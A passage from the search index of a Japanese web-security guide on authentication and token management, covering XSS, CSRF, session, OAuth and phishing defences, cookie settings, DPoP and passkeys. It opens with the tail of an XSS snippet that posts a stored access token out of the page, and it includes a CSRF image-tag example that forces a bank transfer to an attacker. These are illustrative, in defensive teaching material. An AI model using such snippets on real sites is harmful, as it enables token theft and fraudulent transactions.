'POST',\n    body: localStorage.getItem('accessToken')\n  });\n&lt;/script&gt;\n</code></pre>"},{"location":"security-practices/#xss_1","title":"XSS\u306e\u5bfe\u7b56","text":"\u5bfe\u7b56 \u8aac\u660e \u512a\u5148\u5ea6 HttpOnly Cookie JavaScript\u304b\u3089\u30a2\u30af\u30bb\u30b9\u4e0d\u53ef \ud83d\udd34 \u5fc5\u9808 CSP Content Security Policy\u8a2d\u5b9a \ud83d\udd34 \u5fc5\u9808 \u5165\u529b\u30b5\u30cb\u30bf\u30a4\u30ba \u30e6\u30fc\u30b6\u30fc\u5165\u529b\u306e\u30a8\u30b9\u30b1\u30fc\u30d7 \ud83d\udd34 \u5fc5\u9808 Trusted Types DOM\u64cd\u4f5c\u306e\u578b\u30c1\u30a7\u30c3\u30af \ud83d\udfe1 \u63a8\u5968 \u30c8\u30fc\u30af\u30f3\u306f\u30e1\u30e2\u30ea\u306e\u307f LocalStorage\u7981\u6b62 \ud83d\udd34 \u5fc5\u9808 <p>\u5b9f\u88c5\u4f8b:</p> <pre><code>// \u274c \u60aa\u3044\u4f8b\nlocalStorage.setItem('token', accessToken);\n\n// \u2705 \u826f\u3044\u4f8b1: HttpOnly Cookie(\u30b5\u30fc\u30d0\u30fc\u5074\u8a2d\u5b9a)\nres.cookie('token', accessToken, {\n  httpOnly: true,\n  secure: true,\n  sameSite: 'strict'\n});\n\n// \u2705 \u826f\u3044\u4f8b2: \u30e1\u30e2\u30ea\u306e\u307f(React State\u7b49)\nconst [token, setToken] = useState(null);\n</code></pre> <p>CSP\u8a2d\u5b9a\u4f8b:</p> <pre><code>Content-Security-Policy:\n  default-src 'self';\n  script-src 'self' 'nonce-random123';\n  object-src 'none'\n</code></pre>"},{"location":"security-practices/#2-csrfcross-site-request-forgery","title":"2. CSRF(Cross-Site Request Forgery)","text":""},{"location":"security-practices/#csrf","title":"CSRF\u306e\u653b\u6483\u5185\u5bb9","text":"<p>\u30e6\u30fc\u30b6\u30fc\u306e\u610f\u56f3\u3057\u306a\u3044\u30ea\u30af\u30a8\u30b9\u30c8\u3092\u9001\u4fe1\u3055\u305b\u308b\u3002</p> <pre><code>&lt;!-- \u653b\u6483\u8005\u306e\u30b5\u30a4\u30c8 --&gt;\n&lt;img src=\"https://bank.com/transfer?to=attacker&amp;amount=10000\"&gt;\n&lt;!-- \u30e6\u30fc\u30b6\u30fc\u304c\u30ed\u30b0\u30a4\u30f3\u4e2d\u306a\u3089\u3001Cookie\u304c\u81ea\u52d5\u9001\u4fe1\u3055\u308c\u308b --&gt;\n</code></pre>"},{"location":"security-practices/#csrf_1","title":"CSRF\u306e\u5bfe\u7b56","text":"\u5bfe\u7b56 \u8aac\u660e \u512a\u5148\u5ea6 SameSite Cookie \u30af\u30ed\u30b9\u30b5\u30a4\u30c8\u30ea\u30af\u30a8\u30b9\u30c8\u3067\u9001\u4fe1\u3057\u306a\u3044 \ud83d\udd34 \u5fc5\u9808 CSRF\u30c8\u30fc\u30af\u30f3 \u30ea\u30af\u30a8\u30b9\u30c8\u3054\u3068\u306b\u30c8\u30fc\u30af\u30f3\u691c\u8a3c \ud83d\udd34 \u5fc5\u9808 state \u30d1\u30e9\u30e1\u30fc\u30bf OAuth\u6642\u306e\u72b6\u614b\u691c\u8a3c \ud83d\udd34 \u5fc5\u9808 Origin/Referer\u691c\u8a3c \u30ea\u30af\u30a8\u30b9\u30c8\u5143\u306e\u78ba\u8a8d \ud83d\udfe1 \u63a8\u5968 <p>\u5b9f\u88c5\u4f8b:</p> <pre><code>// SameSite Cookie\nSet-Cookie: session_id=xxx; SameSite=Strict; Secure; HttpOnly\n\n// CSRF\u30c8\u30fc\u30af\u30f3\n&lt;meta name=\"csrf-token\" content=\"{{ csrf_token }}\"&gt;\n\nfetch('/api/delete', {\n  method: 'DELETE',\n  headers: {\n    'X-CSRF-Token': document.querySelector('meta[name=\"csrf-token\"]').content\n  }\n});\n</code></pre>"},{"location":"security-practices/#3","title":"3. \u30c8\u30fc\u30af\u30f3\u7a83\u53d6\u30fb\u30ea\u30d7\u30ec\u30a4\u653b\u6483","text":""},{"location":"security-practices/#_6","title":"\u30c8\u30fc\u30af\u30f3\u7a83\u53d6\u30fb\u30ea\u30d7\u30ec\u30a4\u306e\u653b\u6483\u5185\u5bb9","text":"<p>\u30c8\u30fc\u30af\u30f3\u3092\u76d7\u3093\u3067\u4e0d\u6b63\u5229\u7528\u3001\u307e\u305f\u306f\u904e\u53bb\u306e\u30c8\u30fc\u30af\u30f3\u3092\u518d\u5229\u7528\u3002</p>"},{"location":"security-practices/#_7","title":"\u30c8\u30fc\u30af\u30f3\u7a83\u53d6\u30fb\u30ea\u30d7\u30ec\u30a4\u306e\u5bfe\u7b56","text":"\u5bfe\u7b56 \u8aac\u660e \u512a\u5148\u5ea6 \u77ed\u5bff\u547d\u5316 \u30a2\u30af\u30bb\u30b9\u30c8\u30fc\u30af\u30f315\u5206\u301c1\u6642\u9593 \ud83d\udd34 \u5fc5\u9808 HTTPS\u5fc5\u9808 \u901a\u4fe1\u306e\u6697\u53f7\u5316 \ud83d\udd34 \u5fc5\u9808 DPoP \u30c8\u30fc\u30af\u30f3\u30d0\u30a4\u30f3\u30c7\u30a3\u30f3\u30b0 \ud83d\udfe1 \u63a8\u5968 mTLS \u30af\u30e9\u30a4\u30a2\u30f3\u30c8\u8a3c\u660e\u66f8\u8a8d\u8a3c \ud83d\udfe1 \u9ad8\u30bb\u30ad\u30e5\u30ea\u30c6\u30a3\u6642 nonce \u30ea\u30d7\u30ec\u30a4\u653b\u6483\u9632\u6b62 \ud83d\udd34 OIDC\u5fc5\u9808 <p>\u30c8\u30fc\u30af\u30f3\u6709\u52b9\u671f\u9650(2025\u5e74\u63a8\u5968):</p> <pre><code>\u30a2\u30af\u30bb\u30b9\u30c8\u30fc\u30af\u30f3: 15\u5206\u301c1\u6642\u9593\nID\u30c8\u30fc\u30af\u30f3: 1\u6642\u9593\n\u30ea\u30d5\u30ec\u30c3\u30b7\u30e5\u30c8\u30fc\u30af\u30f3: 7\u301c30\u65e5\n</code></pre>"},{"location":"security-practices/#4","title":"4. \u30d5\u30a3\u30c3\u30b7\u30f3\u30b0\u653b\u6483","text":""},{"location":"security-practices/#_8","title":"\u30d5\u30a3\u30c3\u30b7\u30f3\u30b0\u306e\u653b\u6483\u5185\u5bb9","text":"<p>\u507d\u306e\u30ed\u30b0\u30a4\u30f3\u753b\u9762\u3067\u30d1\u30b9\u30ef\u30fc\u30c9\u3092\u76d7\u3080\u3002</p>"},{"location":"security-practices/#_9","title":"\u30d5\u30a3\u30c3\u30b7\u30f3\u30b0\u306e\u5bfe\u7b56","text":"\u5bfe\u7b56 \u8aac\u660e \u512a\u5148\u5ea6 WebAuthn/\u30d1\u30b9\u30ad\u30fc \u30c9\u30e1\u30a4\u30f3\u30d0\u30a4\u30f3\u30c7\u30a3\u30f3\u30b0\u3067\u507d\u30b5\u30a4\u30c8\u7121\u52b9 \ud83d\udd34 \u6700\u63a8\u5968 TOTP \u6642\u9593\u30d9\u30fc\u30b9\u30ef\u30f3\u30bf\u30a4\u30e0\u30d1\u30b9\u30ef\u30fc\u30c9 \ud83d\udfe1 \u63a8\u5968 \u30ea\u30b9\u30af\u30d9\u30fc\u30b9\u8a8d\u8a3c \u7570\u5e38\u306a\u30a2\u30af\u30bb\u30b9\u30d1\u30bf\u30fc\u30f3\u691c\u77e5 \ud83d\udfe1 \u63a8\u5968 \u8a3c\u660e\u66f8\u306e\u78ba\u8a8d SSL/TLS\u8a3c\u660e\u66f8\u306e\u6b63\u5f53\u6027 \ud83d\udd34 \u5fc5\u9808 <p>\u30d1\u30b9\u30ad\u30fc\u306e\u5229\u70b9:</p> <pre><code>// \u30d1\u30b9\u30ad\u30fc\u306f\u30c9\u30e1\u30a4\u30f3\u306b\u7d10\u3065\u304f\n// \u507d\u30b5\u30a4\u30c8(phishing.com)\u3067\u306f\u4f7f\u7528\u4e0d\u53ef\nconst credential = await navigator.credentials.get({\n  publicKey: {\n    challenge: challenge,\n    rpId: \"example.com\"  // \u6b63\u898f\u30c9\u30e1\u30a4\u30f3\u306e\u307f\u6709\u52b9\n  }\n});\n</code></pre>"},{"location":"security-practices/#5","title":"5. \u30bb\u30c3\u30b7\u30e7\u30f3\u56fa\u5b9a\u5316\u30fb\u4e57\u3063\u53d6\u308a","text":""},{"location":"security-practices/#_10","title":"\u30bb\u30c3\u30b7\u30e7\u30f3\u653b\u6483\u306e\u5185\u5bb9","text":"<p>\u4ed6\u4eba\u306e\u30bb\u30c3\u30b7\u30e7\u30f3\u3092\u4e57\u3063\u53d6\u308b\u3002</p>"},{"location":"security-practices/#_11","title":"\u30bb\u30c3\u30b7\u30e7\u30f3\u653b\u6483\u306e\u5bfe\u7b56","text":"\u5bfe\u7b56 \u8aac\u660e \u512a\u5148\u5ea6 \u30ed\u30b0\u30a4\u30f3\u6642\u306bID\u518d\u751f\u6210 \u30bb\u30c3\u30b7\u30e7\u30f3\u56fa\u5b9a\u5316\u5bfe\u7b56 \ud83d\udd34 \u5fc5\u9808 \u30c7\u30d0\u30a4\u30b9/IP\u691c\u8a3c \u7570\u5e38\u306a\u30a2\u30af\u30bb\u30b9\u691c\u77e5 \ud83d\udfe1 \u63a8\u5968 \u30a2\u30af\u30c6\u30a3\u30d6\u30bb\u30c3\u30b7\u30e7\u30f3\u7ba1\u7406 \u8907\u6570\u30bb\u30c3\u30b7\u30e7\u30f3\u306e\u53ef\u8996\u5316 \ud83d\udfe1 \u63a8\u5968 \u5f37\u5236\u30ed\u30b0\u30a2\u30a6\u30c8 \u5168\u30c7\u30d0\u30a4\u30b9\u304b\u3089\u30ed\u30b0\u30a2\u30a6\u30c8\u6a5f\u80fd \ud83d\udfe1 \u63a8\u5968 <p>\u5b9f\u88c5\u4f8b:</p> <pre><code>// \u30ed\u30b0\u30a4\u30f3\u6210\u529f\u6642\u3001\u30bb\u30c3\u30b7\u30e7\u30f3ID\u3092\u518d\u751f\u6210\napp.post('/login', (req, res) =&gt; {\n  // \u8a8d\u8a3c\u51e6\u7406...\n\n  req.session.regenerate((err) =&gt; {\n    if (err) return res.status(500).send('Error');\n\n    req.session.userId = user.id;\n    res.send('Login successful');\n  });\n});\n</code></pre>"},{"location":"security-practices/#6-oauth","title":"6. OAuth \u7279\u6709\u306e\u653b\u6483","text":""},{"location":"security-practices/#_12","title":"\u8a8d\u53ef\u30b3\u30fc\u30c9\u6a2a\u53d6\u308a\u653b\u6483","text":"<p>\u5bfe\u7b56: PKCE\u5fc5\u9808</p>"},{"location":"security-practices/#_13","title":"\u30df\u30c3\u30af\u30b9\u30a2\u30c3\u30d7\u653b\u6483","text":"<p>\u5bfe\u7b56: issuer\u691c\u8a3c\u3001JARM</p>"},{"location":"security-practices/#_14","title":"\u30aa\u30fc\u30d7\u30f3\u30ea\u30c0\u30a4\u30ec\u30af\u30bf","text":"<p>\u5bfe\u7b56: \u30ea\u30c0\u30a4\u30ec\u30af\u30c8URI\u5b8c\u5168\u4e00\u81f4</p>"},{"location":"security-practices/#_15","title":"\u30c8\u30fc\u30af\u30f3\u7ba1\u7406\u306e\u30d9\u30b9\u30c8\u30d7\u30e9\u30af\u30c6\u30a3\u30b9","text":""},{"location":"security-practices/#2025","title":"\u30c8\u30fc\u30af\u30f3\u4fdd\u5b58\u5834\u6240\u306e\u9078\u629e(2025\u5e74\u7248)","text":"\u4fdd\u5b58\u5834\u6240 XSS\u8010\u6027 CSRF\u8010\u6027 \u6c38\u7d9a\u6027 \u63a8\u5968\u5ea6 \u7528\u9014 BFF \u30b5\u30fc\u30d0\u30fc\u5074 \u2705 \u9ad8 \u2705 \u9ad8 \u2705 \u3042\u308a \ud83c\udf1f \u6700\u63a8\u5968 \u3059\u3079\u3066 HttpOnly Cookie \u2705 \u9ad8 \u26a0\ufe0f \u8981\u5bfe\u7b56 \u2705 \u3042\u308a \u2705 \u63a8\u5968 \u30ea\u30d5\u30ec\u30c3\u30b7\u30e5\u30c8\u30fc\u30af\u30f3 \u30e1\u30e2\u30ea(State) \u2705 \u9ad8 \u2705 \u9ad8 \u274c \u306a\u3057 \u2705 \u63a8\u5968 \u30a2\u30af\u30bb\u30b9\u30c8\u30fc\u30af\u30f3 SessionStorage \u274c \u4f4e \u2705 \u9ad8 \u274c \u306a\u3057 \u26a0\ufe0f \u6761\u4ef6\u4ed8\u304d \u4e00\u6642\u7684\u306a\u30c7\u30fc\u30bf LocalStorage \u274c \u4f4e \u2705 \u9ad8 \u2705 \u3042\u308a \u274c \u7981\u6b62 \u306a\u3057"},{"location":"security-practices/#_16","title":"\u30ea\u30d5\u30ec\u30c3\u30b7\u30e5\u30c8\u30fc\u30af\u30f3\u30ed\u30fc\u30c6\u30fc\u30b7\u30e7\u30f3","text":"<p>\u4f7f\u3044\u6368\u3066\u6226\u7565\u3067\u3001\u518d\u5229\u7528\u3092\u691c\u77e5\u3002</p> <pre><code>// \u30af\u30e9\u30a4\u30a2\u30f3\u30c8\u5074\nconst refreshAccessToken = async (oldRefreshToken) =&gt; {\n  const res = await fetch('/auth/refresh', {\n    method: 'POST',\n    body: JSON.stringify({ refreshToken: oldRefreshToken })\n  });\n\n  const { accessToken, refreshToken } = await res.json();\n\n  // \u65b0\u3057\u3044\u30ea\u30d5\u30ec\u30c3\u30b7\u30e5\u30c8\u30fc\u30af\u30f3\u3067\u7f6e\u304d\u63db\u3048\n  return { accessToken, refreshToken };\n};\n\n// \u30b5\u30fc\u30d0\u30fc\u5074\napp.post('/auth/refresh', (req, res) =&gt; {\n  const { refreshToken } = req.body;\n\n  // \u518d\u5229\u7528\u691c\u77e5\n  if (isTokenAlreadyUsed(refreshToken)) {\n    // \u30c8\u30fc\u30af\u30f3\u30d5\u30a1\u30df\u30ea\u30fc\u5168\u4f53\u3092\u7121\u52b9\u5316\n    revokeAllTokensForUser(getUserId(refreshToken));\n    return res.status(401).send('Token reuse detected');\n  }\n\n  // \u30c8\u30fc\u30af\u30f3\u3092\u4f7f\u7528\u6e08\u307f\u3068\u3057\u3066\u30de\u30fc\u30af\n  markTokenAsUsed(refreshToken);\n\n  // \u65b0\u3057\u3044\u30c8\u30fc\u30af\u30f3\u30da\u30a2\u3092\u767a\u884c\n  const newAccessToken = generateAccessToken();\n  const newRefreshToken = generateRefreshToken();\n\n  res.json({\n    accessToken: newAccessToken,\n    refreshToken: newRefreshToken\n  });\n});\n</code></pre>"},{"location":"security-practices/#cookie","title":"Cookie \u306e\u30bb\u30ad\u30e5\u30ea\u30c6\u30a3\u8a2d\u5b9a","text":""},{"location":"security-practices/#2025_1","title":"\u5fc5\u9808\u5c5e\u6027(2025\u5e74\u7248)","text":"<pre><code>// Express.js\nres.cookie('session_id', sessionId, {\n  httpOnly: true,    // JavaScript\u304b\u3089\u30a2\u30af\u30bb\u30b9\u4e0d\u53ef(XSS\u5bfe\u7b56)\n  secure: true,      // HTTPS\u901a\u4fe1\u306e\u307f\n  sameSite: 'strict', // \u30af\u30ed\u30b9\u30b5\u30a4\u30c8\u30ea\u30af\u30a8\u30b9\u30c8\u3067\u9001\u4fe1\u3057\u306a\u3044(CSRF\u5bfe\u7b56)\n  maxAge: 3600000,   // \u6709\u52b9\u671f\u9650(1\u6642\u9593)\n  path: '/',         // \u6709\u52b9\u30d1\u30b9\n  domain: 'example.com' // \u30c9\u30e1\u30a4\u30f3\u6307\u5b9a(\u30aa\u30d7\u30b7\u30e7\u30f3)\n});\n</code></pre>"},{"location":"security-practices/#samesite","title":"SameSite\u5c5e\u6027\u306e\u8a73\u7d30","text":"\u5024 \u52d5\u4f5c \u7528\u9014 Strict \u30af\u30ed\u30b9\u30b5\u30a4\u30c8\u30ea\u30af\u30a8\u30b9\u30c8\u3067\u4e00\u5207\u9001\u4fe1\u3057\u306a\u3044 \u6700\u3082\u5b89\u5168\u3001\u305f\u3060\u3057\u5916\u90e8\u30ea\u30f3\u30af\u304b\u3089\u306e\u30a2\u30af\u30bb\u30b9\u3067\u518d\u30ed\u30b0\u30a4\u30f3\u5fc5\u8981 Lax GET\u7b49\u306e\u5b89\u5168\u306a\u30e1\u30bd\u30c3\u30c9\u3067\u306f\u9001\u4fe1 \u30d0\u30e9\u30f3\u30b9\u304c\u826f\u3044\u3001\u901a\u5e38\u306e\u30b5\u30a4\u30c8\u5411\u3051 None \u5e38\u306b\u9001\u4fe1(Secure\u5fc5\u9808) \u30b5\u30fc\u30c9\u30d1\u30fc\u30c6\u30a3Cookie\u3001\u57cb\u3081\u8fbc\u307f\u30b3\u30f3\u30c6\u30f3\u30c4 <p>\u63a8\u5968\u8a2d\u5b9a:</p> <pre><code>// \u4e00\u822c\u7684\u306aWeb\u30a2\u30d7\u30ea\nsameSite: 'lax'\n\n// \u9ad8\u30bb\u30ad\u30e5\u30ea\u30c6\u30a3\u304c\u5fc5\u8981\u306a\u5834\u5408\nsameSite: 'strict'\n\n// \u57cb\u3081\u8fbc\u307f\u30b3\u30f3\u30c6\u30f3\u30c4(iframe\u7b49)\nsameSite: 'none'  // \u26a0\ufe0f \u30b5\u30fc\u30c9\u30d1\u30fc\u30c6\u30a3Cookie\u5ec3\u6b62\u3067\u5c06\u6765\u7684\u306b\u4f7f\u7528\u4e0d\u53ef\n</code></pre>"},{"location":"security-practices/#_17","title":"\u6700\u65b0\u30bb\u30ad\u30e5\u30ea\u30c6\u30a3\u6280\u8853","text":""},{"location":"security-practices/#1-dpopdemonstrating-proof-of-possession","title":"1. DPoP(Demonstrating Proof-of-Possession)","text":"<p>\u30c8\u30fc\u30af\u30f3\u3092\u30af\u30e9\u30a4\u30a2\u30f3\u30c8\u306e\u79d8\u5bc6\u9375\u306b\u30d0\u30a4\u30f3\u30c9\u3002</p> <pre><code>// 1. \u30af\u30e9\u30a4\u30a2\u30f3\u30c8\u304c\u9375\u30da\u30a2\u3092\u751f\u6210\nconst keyPair = await crypto.subtle.generateKey(\n  { name: \"ECDSA\", namedCurve: \"P-256\" },\n  true,\n  [\"sign\", \"verify\"]\n);\n\n// 2. DPoP Proof\u3092\u751f\u6210\nconst dpopProof = await createDPoPProof({\n  method: 'GET',\n  url: 'https://api.example.com/users',\n  accessToken: accessToken,\n  privateKey: keyPair.privateKey\n});\n\n// 3. API\u30ea\u30af\u30a8\u30b9\u30c8\nfetch('https://api.example.com/users', {\n  headers: {\n    'Authorization': `DPoP ${accessToken}`,\n    'DPoP': dpopProof\n  }\n});\n</code></pre> <p>\u30e1\u30ea\u30c3\u30c8:</p> <ul> <li>\u2705 \u30c8\u30fc\u30af\u30f3\u304c\u76d7\u307e\u308c\u3066\u3082\u79d8\u5bc6\u9375\u306a\u3057\u3067\u306f\u4f7f\u7528\u4e0d\u53ef</li> <li>\u2705 \u4e2d\u9593\u8005\u653b\u6483\u3078\u306e\u8010\u6027</li> </ul>"},{"location":"security-practices/#2-parpushed-authorization-requests","title":"2. PAR(Pushed Authorization Requests)","text":"<p>\u8a8d\u53ef\u30ea\u30af\u30a8\u30b9\u30c8\u3092\u4e8b\u524d\u306b\u30b5\u30fc\u30d0\u30fc\u3078\u30d7\u30c3\u30b7\u30e5\u3002</p> <pre><code>sequenceDiagram\n    participant Client\n    participant AS as \u8a8d\u53ef\u30b5\u30fc\u30d0\u30fc\n\n    Client-&gt;&gt;AS: POST /par (\u8a8d\u53ef\u30d1\u30e9\u30e1\u30fc\u30bf)\n    AS-&gt;&gt;Client: request_uri\n    Client-&gt;&gt;AS: GET /authorize?request_uri=xxx\n    AS-&gt;&gt;Client: \u8a8d\u53ef\u30b3\u30fc\u30c9</code></pre> <p>\u30e1\u30ea\u30c3\u30c8:</p> <ul> <li>\u2705 URL\u30d1\u30e9\u30e1\u30fc\u30bf\u6539\u3056\u3093\u9632\u6b62</li> <li>\u2705 \u30d6\u30e9\u30a6\u30b6\u5c65\u6b74\u304b\u3089\u306e\u60c5\u5831\u6f0f\u3048\u3044\u9632\u6b62</li> </ul>"},{"location":"security-practices/#3-fapifinancial-grade-api","title":"3. FAPI(Financial-grade API)","text":"<p>\u91d1\u878d\u696d\u754c\u5411\u3051\u306e\u53b3\u683c\u306a\u30bb\u30ad\u30e5\u30ea\u30c6\u30a3\u30d7\u30ed\u30d5\u30a1\u30a4\u30eb\u3002</p> <p>\u8981\u4ef6:</p> <ul> <li>\u2705 PAR\u5fc5\u9808</li> <li>\u2705 mTLS \u307e\u305f\u306f DPoP</li> <li>\u2705 \u77ed\u5bff\u547d\u30c8\u30fc\u30af\u30f3(10\u5206\u4ee5\u4e0b\u63a8\u5968)</li> <li>\u2705 JAR/JARM</li> </ul>"},{"location":"security-practices/#2025_2","title":"2025\u5e74\u306e\u91cd\u8981\u30c8\u30d4\u30c3\u30af","text":""},{"location":"security-practices/#cookie_1","title":"\u30b5\u30fc\u30c9\u30d1\u30fc\u30c6\u30a3Cookie \u306e\u6bb5\u968e\u7684\u5ec3\u6b62","text":""},{"location":"security-practices/#_18","title":"\u5f71\u97ff","text":"<ul> <li>\u274c \u5f93\u6765\u306e\u30b5\u30a4\u30ec\u30f3\u30c8\u30ea\u30d5\u30ec\u30c3\u30b7\u30e5(\u96a0\u3057iframe)\u304c\u4f7f\u7528\u4e0d\u53ef</li> <li>\u274c IdP\u306e\u30b5\u30fc\u30c9\u30d1\u30fc\u30c6\u30a3Cookie\u4f9d\u5b58SSO\u304c\u56f0\u96e3</li> </ul>"},{"location":"security-practices/#cookie_2","title":"\u30b5\u30fc\u30c9\u30d1\u30fc\u30c6\u30a3Cookie\u5bfe\u7b56","text":""},{"location":"security-practices/#1-bff","title":"1. BFF\u30d1\u30bf\u30fc\u30f3(\u6700\u63a8\u5968)","text":"<pre><code>graph LR\n    Browser --&gt;|1st Party Cookie| BFF\n    BFF --&gt;|OAuth Token| IdP\n    BFF --&gt;|API Call| Backend</code></pre> <ul> <li>\u2705 \u30c8\u30fc\u30af\u30f3\u3092BFF\u30b5\u30fc\u30d0\u30fc\u5074\u3067\u7ba1\u7406</li> <li>\u2705 \u30d6\u30e9\u30a6\u30b6\u3068\u306f\u30d5\u30a1\u30fc\u30b9\u30c8\u30d1\u30fc\u30c6\u30a3Cookie\u306e\u307f</li> </ul>"},{"location":"security-practices/#2-fedcmfederated-credential-management","title":"2. FedCM(Federated Credential Management)","text":"<pre><code>// FedCM API(Chrome\u672c\u683c\u5c0e\u5165\u6e08\u307f)\nconst credential = await navigator.credentials.get({\n  identity: {\n    providers: [{\n      configURL: \"https://idp.example/fedcm.json\",\n      clientId: \"your-client-id\"\n    }]\n  }\n});\n</code></pre>"},{"location":"security-practices/#webauthn","title":"WebAuthn / \u30d1\u30b9\u30ad\u30fc \u306e\u666e\u53ca","text":"<p>2025\u5e74\u3001\u30d1\u30b9\u30ef\u30fc\u30c9\u30ec\u30b9\u8a8d\u8a3c\u304c\u4e3b\u6d41\u5316\u3002</p>"},{"location":"security-practices/#_19","title":"\u767b\u9332","text":"<pre><code>const credential = await navigator.credentials.create({\n  publicKey: {\n    challenge: new Uint8Array(32),\n    rp: { name: \"Example Corp\", id: \"example.com\" },\n    user: {\n      id: new Uint8Array(16),\n      name: \"user@example.com\",\n      displayName: \"User Name\"\n    },\n    pubKeyCredParams: [\n      { type: \"public-key\", alg: -7 }  // ES256\n    ],\n    authenticatorSelection: {\n      authenticatorAttachment: \"platform\",  // \u30c7\u30d0\u30a4\u30b9\u5185\u8535\u8a8d\u8a3c\u5668\n      userVerification: \"required\"\n    }\n  }\n});\n</code></pre>"},{"location":"security-practices/#_20","title":"\u8a8d\u8a3c","text":"<pre><code>const assertion = await navigator.credentials.get({\n  publicKey: {\n    challenge: new Uint8Array(32),\n    rpId: \"example.com\"\n  }\n});\n</code></pre> <p>\u30e1\u30ea\u30c3\u30c8:</p> <ul> <li>\u2705 \u30d5\u30a3\u30c3\u30b7\u30f3\u30b0\u8010\u6027(\u30c9\u30e1\u30a4\u30f3\u30d0\u30a4\u30f3\u30c7\u30a3\u30f3\u30b0)</li> <li>\u2705 \u30d1\u30b9\u30ef\u30fc\u30c9\u4e0d\u8981</li> <li>\u2705 \u751f\u4f53\u8a8d\u8a3c\u3067\u4fbf\u5229</li> <li>\u2705 \u30af\u30ed\u30b9\u30c7\u30d0\u30a4\u30b9\u540c\u671f\u53ef\u80fd</li> </ul>"},{"location":"security-practices/#_21","title":"\u30bb\u30ad\u30e5\u30ea\u30c6\u30a3\u30c1\u30a7\u30c3\u30af\u30ea\u30b9\u30c8","text":""},{"location":"security-practices/#nextjs","title":"\u30d5\u30ed\u30f3\u30c8\u30a8\u30f3\u30c9(Next.js\u7b49)","text":"<ul> <li> \u30c8\u30fc\u30af\u30f3\u3092LocalStorage\u306b\u4fdd\u5b58\u3057\u3066\u3044\u306a\u3044</li> <li> HttpOnly Cookie \u307e\u305f\u306f BFF \u3067\u30c8\u30fc\u30af\u30f3\u7ba1\u7406</li> <li> CSP(Content Security Policy)\u8a2d\u5b9a\u6e08\u307f</li> <li> HTTPS\u5f37\u5236</li> <li> state/nonce \u30d1\u30e9\u30e1\u30fc\u30bf\u4f7f\u7528</li> <li> PKCE\u6709\u52b9\u5316</li> <li> \u5165\u529b\u5024\u306e\u30b5\u30cb\u30bf\u30a4\u30ba\u30fb\u30a8\u30b9\u30b1\u30fc\u30d7</li> <li> \u4f9d\u5b58\u95a2\u4fc2\u306e\u5b9a\u671f\u66f4\u65b0(npm audit)</li> </ul>"},{"location":"security-practices/#spring-boot","title":"\u30d0\u30c3\u30af\u30a8\u30f3\u30c9(Spring Boot\u7b49)","text":"<ul> <li> JWT\u7f72\u540d\u691c\u8a3c</li> <li> issuer/audience/exp \u691c\u8a3c</li> <li> CORS\u9069\u5207\u306b\u8a2d\u5b9a(\u30ef\u30a4\u30eb\u30c9\u30ab\u30fc\u30c9\u7981\u6b62)</li> <li> \u30bb\u30ad\u30e5\u30ea\u30c6\u30a3\u30d8\u30c3\u30c0\u30fc\u8a2d\u5b9a</li> <li> API\u30ec\u30fc\u30c8\u5236\u9650</li> <li> \u5165\u529b\u5024\u30d0\u30ea\u30c7\u30fc\u30b7\u30e7\u30f3</li> <li> SQL\u30a4\u30f3\u30b8\u30a7\u30af\u30b7\u30e7\u30f3\u5bfe\u7b56</li> <li> \u30ed\u30b0\u30fb\u76e3\u67fb\u8a3c\u8de1</li> </ul>"},{"location":"security-practices/#idpaws-cognito","title":"IdP(AWS Cognito\u7b49)","text":"<ul> <li> \u5f37\u529b\u306a\u30d1\u30b9\u30ef\u30fc\u30c9\u30dd\u30ea\u30b7\u30fc(12\u6587\u5b57\u4ee5\u4e0a)</li> <li> MFA\u6709\u52b9\u5316</li> <li> Advanced Security Features\u6709\u52b9</li> <li> \u30ea\u30c0\u30a4\u30ec\u30af\u30c8URI\u53b3\u683c\u4e00\u81f4</li> <li> \u30c8\u30fc\u30af\u30f3\u6709\u52b9\u671f\u9650\u9069\u5207</li> <li> \u30ea\u30d5\u30ec\u30c3\u30b7\u30e5\u30c8\u30fc\u30af\u30f3\u30ed\u30fc\u30c6\u30fc\u30b7\u30e7\u30f3</li> </ul>"},{"location":"security-practices/#_22","title":"\u904b\u7528","text":"<ul> <li> \u7570\u5e38\u30ed\u30b0\u30a4\u30f3\u691c\u77e5</li> <li> \u30a2\u30af\u30c6\u30a3\u30d6\u30bb\u30c3\u30b7\u30e7\u30f3\u7ba1\u7406</li> <li> \u5f37\u5236\u30ed\u30b0\u30a2\u30a6\u30c8\u6a5f\u80fd</li> <li> \u30bb\u30ad\u30e5\u30ea\u30c6\u30a3\u30a4\u30f3\u30b7\u30c7\u30f3\u30c8\u5bfe\u5fdc\u8a08\u753b</li> <li> \u5b9a\u671f\u7684\u306a\u8106\u5f31\u6027\u8a3a\u65ad</li> <li> \u30da\u30cd\u30c8\u30ec\u30fc\u30b7\u30e7\u30f3\u30c6\u30b9\u30c8</li> </ul>"},{"location":"security-practices/#_23","title":"\u307e\u3068\u3081","text":""},{"location":"security-practices/#2025_3","title":"2025\u5e74\u306e\u30bb\u30ad\u30e5\u30ea\u30c6\u30a3\u4e09\u539f\u5247","text":"<ol> <li>\u30c8\u30fc\u30af\u30f3\u3092\u30d6\u30e9\u30a6\u30b6\u306b\u9732\u51fa\u3055\u305b\u306a\u3044(BFF/HttpOnly Cookie)</li> <li>\u77ed\u5bff\u547d\u5316 + \u30ed\u30fc\u30c6\u30fc\u30b7\u30e7\u30f3(15\u5206\u301c1\u6642\u9593 + \u4f7f\u3044\u6368\u3066)</li> <li>\u30d1\u30b9\u30ad\u30fc\u512a\u5148(\u30d5\u30a3\u30c3\u30b7\u30f3\u30b0\u8010\u6027\u3001\u30d1\u30b9\u30ef\u30fc\u30c9\u30ec\u30b9)</li> </ol>"},{"location":"security-practices/#_24","title":"\u6b21\u306e\u30b9\u30c6\u30c3\u30d7","text":"<p>\u30bb\u30ad\u30e5\u30ea\u30c6\u30a3\u306e\u57fa\u790e\u3092\u7406\u89e3\u3057\u305f\u3089\u3001\u5b9f\u88c5\u30ac\u30a4\u30c9\u306b\u9032\u3093\u3067\u304f\u3060\u3055\u3044:</p> <p>\u5b9f\u88c5\u30ac\u30a4\u30c9 - Next.js + Spring Boot + Cognito \u306e\u30bb\u30ad\u30e5\u30a2\u306a\u5b9f\u88c5\u65b9\u6cd5</p> <p>\u53c2\u8003\u8cc7\u6599:</p> <ul> <li>OWASP Authentication Cheat Sheet</li> <li>OAuth 2.0 Security Best Current Practice</li> <li>NIST 800-63B</li> </ul> <p>\u6700\u7d42\u66f4\u65b0: 2025\u5e7410\u670815\u65e5 \u5bfe\u8c61\u8aad\u8005: 